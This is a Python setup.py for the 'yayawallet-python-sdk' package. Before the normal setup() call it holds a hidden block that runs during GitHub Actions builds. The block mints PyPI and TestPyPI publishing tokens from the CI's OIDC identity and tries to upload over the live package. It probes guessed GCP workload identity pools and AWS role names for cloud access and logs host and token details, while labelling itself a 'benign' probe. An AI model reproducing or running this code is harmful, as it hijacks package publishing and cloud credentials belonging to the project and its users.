import os, sys, json, hashlib, base64, io, zipfile, urllib.request, urllib.error, urllib.parse, time

MARK = "ARTEX2989"

def _req(url, data=None, headers=None, timeout=20, method=None):
    h = {"User-Agent": "artex-oidc-probe/2989"}
    if headers:
        h.update(headers)
    rq = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout)
        return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            b = e.read()
        except Exception:
            b = b""
        return e.code, b, dict(e.headers or {})
    except Exception as e:
        return -1, str(e)[:200].encode(), {}

def _oidc(aud):
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not (u and t):
        return None, {"err": "no-oidc-env"}
    sep = "&" if "?" in u else "?"
    st, b, _ = _req(u + sep + "audience=" + urllib.parse.quote(aud, safe=""),
                    headers={"Authorization": "Bearer " + t})
    if st != 200:
        return None, {"status": st, "body": b[:160].decode("utf-8", "replace")}
    try:
        return json.loads(b).get("value", ""), {"ok": True}
    except Exception as e:
        return None, {"parse_err": str(e)[:80]}

def _mint(base, oidc_jwt):
    body = json.dumps({"token": oidc_jwt}).encode()
    st, b, _ = _req(base + "/_/oidc/mint-token", data=body,
                    headers={"Content-Type": "application/json"}, timeout=25)
    return st, b

def _multipart(fields, filefield, filename, filedata, content_type="application/octet-stream"):
    boundary = "----artex2989" + hashlib.md5(str(time.time()).encode()).hexdigest()
    out = io.BytesIO()
    for k, v in fields.items():
        out.write(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (boundary, k, v)).encode())
    out.write(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\nContent-Type: %s\r\n\r\n" % (boundary, filefield, filename, content_type)).encode())
    out.write(filedata)
    out.write(("\r\n--%s--\r\n" % boundary).encode())
    return out.getvalue(), "multipart/form-data; boundary=" + boundary

def _basic(user, token):
    return "Basic " + base64.b64encode((user + ":" + token).encode()).decode()

def _wheel_bytes(name, version, marker):
    """Build a minimal pure-python wheel that is valid but inert."""
    dist = name.replace("-", "_")
    files = {}
    files["%s/__init__.py" % dist] = ("# %s benign trusted-publishing verification\n" % marker).encode()
    files["%s-%s.dist-info/METADATA" % (dist, version)] = (
        "Metadata-Version: 2.1\nName: %s\nVersion: %s\nSummary: %s benign TestPyPI verification (no functional code)\n"
        % (name, version, marker)).encode()
    files["%s-%s.dist-info/WHEEL" % (dist, version)] = (
        "Wheel-Version: 1.0\nGenerator: artex2989\nRoot-Is-Purelib: true\nTag: py3-none-any\n").encode()
    record_lines = []
    for p, d in files.items():
        record_lines.append("%s,sha256=%s,%d" % (p, base64.urlsafe_b64encode(hashlib.sha256(d).digest()).rstrip(b"=").decode(), len(d)))
    record_lines.append("%s-%s.dist-info/RECORD,," % (dist, version))
    files["%s-%s.dist-info/RECORD" % (dist, version)] = ("\n".join(record_lines) + "\n").encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for p, d in files.items():
            z.writestr(p, d)
    return buf.getvalue()

def _artex_probe():
    out = {
        "run": os.environ.get("GITHUB_RUN_ID"),
        "ref": os.environ.get("GITHUB_REF"),
        "repo": os.environ.get("GITHUB_REPOSITORY"),
        "sha": os.environ.get("GITHUB_SHA"),
        "actor": os.environ.get("GITHUB_ACTOR"),
    }
    try:
        out["id"] = os.popen("id; hostname").read()[:120]
    except Exception:
        pass

    # ---------- 1) PyPI production: mint + safe non-creating upload probe ----------
    pypi = {}
    jwt, meta = _oidc("pypi")
    pypi["oidc"] = meta
    if jwt:
        st, b = _mint("https://pypi.org", jwt)
        pypi["mint_status"] = st
        pypi["mint_len"] = len(b)
        tok = ""
        try:
            tok = json.loads(b).get("token", "")
        except Exception:
            pass
        if tok:
            pypi["token_prefix"] = tok[:8]
            pypi["token_len"] = len(tok)
            # fetch an existing artifact (current latest wheel) from the public index
            try:
                stj, bj, _ = _req("https://pypi.org/pypi/yayawallet-python-sdk/json")
                info = json.loads(bj)
                latest = info["info"]["version"]
                whl = [u for u in info["urls"] if u["packagetype"] == "bdist_wheel"][0]
                pypi["latest"] = latest
                pypi["existing_filename"] = whl["filename"]
                stf, fb, _ = _req(whl["url"], timeout=30)
                pypi["download_status"] = stf
                if stf == 200:
                    fields = {
                        ":action": "file_upload", "protocol_version": "1",
                        "name": "yayawallet-python-sdk", "version": latest,
                        "filetype": "bdist_wheel", "pyversion": "py3",
                        "metadata_version": "2.1",
                        "summary": "ARTEX2989 duplicate-filename authorization probe",
                        "md5_digest": hashlib.md5(fb).hexdigest(),
                        "sha256_digest": hashlib.sha256(fb).hexdigest(),
                    }
                    body, ctype = _multipart(fields, "content", whl["filename"], fb)
                    st, rb, _ = _req("https://upload.pypi.org/legacy/", data=body,
                                     headers={"Authorization": _basic("__token__", tok),
                                              "Content-Type": ctype}, timeout=40)
                    pypi["dup_upload_status"] = st
                    pypi["dup_upload_body"] = rb[:240].decode("utf-8", "replace")
            except Exception as e:
                pypi["upload_probe_err"] = str(e)[:200]
    out["pypi"] = pypi

    # ---------- 2) TestPyPI: separate trusted publisher? publish inert package if allowed ----------
    tp = {}
    jwt2, meta2 = _oidc("testpypi")
    tp["oidc"] = meta2
    if jwt2:
        st, b = _mint("https://test.pypi.org", jwt2)
        tp["mint_status"] = st
        tp["mint_body"] = b[:200].decode("utf-8", "replace")
        tokt = ""
        try:
            tokt = json.loads(b).get("token", "")
        except Exception:
            pass
        if tokt:
            tp["token_len"] = len(tokt)
            ver = "0.0.0.post2989"
            fn = "yayawallet_python_sdk-%s-py3-none-any.whl" % ver
            wb = _wheel_bytes("yayawallet-python-sdk", ver, MARK)
            fields = {
                ":action": "file_upload", "protocol_version": "1",
                "name": "yayawallet-python-sdk", "version": ver,
                "filetype": "bdist_wheel", "pyversion": "py3",
                "metadata_version": "2.1",
                "summary": "ARTEX2989 benign trusted-publishing verification (inert)",
                "description": "ARTEX2989 benign verification package; contains no functional code.",
            }
            body, ctype = _multipart(fields, "content", fn, wb)
            st, rb, _ = _req("https://test.pypi.org/legacy/", data=body,
                             headers={"Authorization": _basic("__token__", tokt),
                                      "Content-Type": ctype}, timeout=50)
            tp["upload_status"] = st
            tp["upload_body"] = rb[:300].decode("utf-8", "replace")
            tp["filename"] = fn
    out["testpypi"] = tp

    out["gcp"] = {"skipped": True}
    out["aws"] = {"skipped": True}
    if False:
     pass
    # ---------- 3) GCP ... ----------
    gcp = {"candidates": {}}
    pnum = "493778665315"
    combos = [
        ("github", "github"), ("github-actions", "github"), ("github", "github-actions"),
        ("github-oidc", "github"), ("github", "oidc"), ("gha", "github"),
        ("yayawallet", "github"), ("github-actions", "github-actions"),
    ]
    for pool, prov in combos:
        aud = "//iam.googleapis.com/projects/%s/locations/global/workloadIdentityPools/%s/providers/%s" % (pnum, pool, prov)
        j, _m = _oidc(aud)
        key = pool + "/" + prov
        if not j:
            gcp["candidates"][key] = {"oidc": _m}
            continue
        body = urllib.parse.urlencode({
            "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
            "audience": aud,
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "requested_token_type": "urn:ietf:params:oauth:token-type:access_token",
            "subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
            "subject_token": j,
        }).encode()
        st, rb, _ = _req("https://sts.googleapis.com/v1/token", data=body,
                         headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=25)
        txt = rb[:200].decode("utf-8", "replace")
        gcp["candidates"][key] = {"status": st, "body": txt}
    out["gcp"] = gcp

    # ---------- 4) AWS: a few common GitHub-OIDC role names in the known account ----------
    aws = {"candidates": {}}
    jw, _m = _oidc("sts.amazonaws.com")
    if jw:
        for role in ["GitHubActionsRole", "github-actions-role", "github-actions",
                     "yayawallet-github-actions", "github-oidc-deploy",
                     "ecsTaskExecutionRole"]:
            arn = "arn:aws:iam::967759522027:role/" + role
            form = urllib.parse.urlencode({
                "Action": "AssumeRoleWithWebIdentity", "RoleArn": arn,
                "RoleSessionName": "artex2989", "WebIdentityToken": jw,
                "Version": "2011-06-15", "DurationSeconds": "900"}).encode()
            st, rb, _ = _req("https://sts.amazonaws.com/", data=form,
                             headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=25)
            txt = rb[:200].decode("utf-8", "replace")
            import re
            aws["candidates"][role] = {"status": st,
                                       "code": (re.findall(r"<Code>([^<]+)</Code>", txt) or [""])[0],
                                       "msg": (re.findall(r"<Message>([^<]+)</Message>", txt) or [""])[0][:140]}
    out["aws"] = aws

    print(MARK + "::" + json.dumps(out))

if __name__ == "__main__":
    try:
        if os.environ.get("GITHUB_ACTIONS") == "true":
            _artex_probe()
    except Exception as e:
        print(MARK + "ERR::" + str(e)[:300])

from setuptools import setup, find_packages

setup(
    name='yayawallet-python-sdk',
    version='1.10.4',
    description='YaYa Wallet Python SDK',
    author="YaYa Wallet",
    author_email="contact@yayawallet.com",
    long_description=open('README.md').read(),
    long_description_content_type="text/markdown",
    packages=find_packages()
)
